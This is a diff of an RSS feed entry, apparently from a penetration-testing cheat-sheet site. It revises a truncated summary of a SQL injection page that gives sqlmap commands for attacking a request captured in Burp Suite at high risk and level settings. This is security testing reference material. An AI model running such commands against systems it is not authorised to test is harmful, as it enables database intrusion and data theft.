@@ -12,7 +12,7 @@
       <link>https://tldrbins.github.io/sql_injection/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/sql_injection/</guid>
-      <description>sqlmap # In Burp Suite, we can right click the request and click `copy to file` to save the request # And add `*` to request to indicate the sql injection point # Initial testing HTTP sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 # Initial testing HTTPS sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --force-ssl # Add a string to indicate injection succeed (e.</description>
+      <description>sqlmap 1. Copy HTTP Request +---------------------------------------------------------------+ | In Burp Suite =&amp;gt; Right click request =&amp;gt; Select `copy to file` | | Add `*` to the SQL injection point | +---------------------------------------------------------------+ 2. Initial Enum # HTTP sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 # HTTPS sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --force-ssl # String to match when query is evaluated to True sqlmap -r request --batch --proxy=http://127.</description>
     </item>
   </channel>
 </rss>
